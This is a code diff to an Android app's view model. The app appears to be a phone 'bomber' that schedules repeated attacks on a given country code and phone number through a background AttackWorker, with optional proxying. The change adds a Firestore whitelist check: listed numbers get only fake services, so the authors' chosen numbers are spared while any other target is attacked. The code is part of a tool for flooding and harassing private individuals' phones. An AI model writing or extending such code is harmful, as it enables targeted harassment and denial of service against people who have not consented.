@@ -301,8 +301,8 @@ public class MainViewModel extends ViewModel {
     }
 
     private CollectionReference getDatabaseMain() {
-        return FirebaseFirestore.getInstance().
-                collection("main");
+        return FirebaseFirestore.getInstance()
+                .collection("main");
     }
 
     public void downloadUpdate(String url) {
@@ -327,29 +327,38 @@ public class MainViewModel extends ViewModel {
     }
 
     public void scheduleAttack(String countryCode, String phoneNumber, int repeats, long date, long current) {
-        Data inputData = new Data.Builder()
-                .putString(AttackWorker.KEY_COUNTRY_CODE, countryCode)
-                .putString(AttackWorker.KEY_PHONE, phoneNumber)
-                .putInt(AttackWorker.KEY_REPEATS, Math.min(repeats, BuildVars.MAX_REPEATS_COUNT))
-                .putBoolean(AttackWorker.KEY_PROXY_ENABLED, repository.isProxyEnabled())
-                .build();
+        FirebaseFirestore.getInstance()
+                .collection("whitelist")
+                .document(countryCode + phoneNumber)
+                .get()
+                .addOnCompleteListener(task -> {
+                    boolean notWhitelist = !task.isSuccessful() || task.getResult().getData() == null;
 
-        OneTimeWorkRequest workRequest = new OneTimeWorkRequest.Builder(AttackWorker.class)
-                .addTag(ATTACK)
-                .addTag("+" + countryCode + phoneNumber + ";" + date)
-                .setInitialDelay(date - current, TimeUnit.MILLISECONDS)
-                .setInputData(inputData)
-                .setConstraints(new Constraints.Builder()
-                        .setRequiredNetworkType(NetworkType.CONNECTED)
-                        .build())
-                .build();
+                    Data inputData = new Data.Builder()
+                            .putString(AttackWorker.KEY_COUNTRY_CODE, countryCode)
+                            .putString(AttackWorker.KEY_PHONE, phoneNumber)
+                            .putInt(AttackWorker.KEY_REPEATS, Math.min(repeats, BuildVars.MAX_REPEATS_COUNT))
+                            .putBoolean(AttackWorker.KEY_PROXY_ENABLED, repository.isProxyEnabled())
+                            .putBoolean(AttackWorker.KEY_FAKE_SERVICES, !notWhitelist)
+                            .build();
 
-        if (current == 0) {
-            progress.setValue(new Progress(R.drawable.logo, R.string.attack));
-            pushCurrentWork(workRequest);
-        }
+                    OneTimeWorkRequest workRequest = new OneTimeWorkRequest.Builder(AttackWorker.class)
+                            .addTag(ATTACK)
+                            .addTag("+" + countryCode + phoneNumber + ";" + date)
+                            .setInitialDelay(date - current, TimeUnit.MILLISECONDS)
+                            .setInputData(inputData)
+                            .setConstraints(new Constraints.Builder()
+                                    .setRequiredNetworkType(NetworkType.CONNECTED)
+                                    .build())
+                            .build();
 
-        workManager.enqueue(workRequest);
+                    if (current == 0) {
+                        progress.setValue(new Progress(R.drawable.logo, R.string.attack));
+                        pushCurrentWork(workRequest);
+                    }
+
+                    workManager.enqueue(workRequest);
+                });
     }
 
     private void pushCurrentWork(WorkRequest request) {
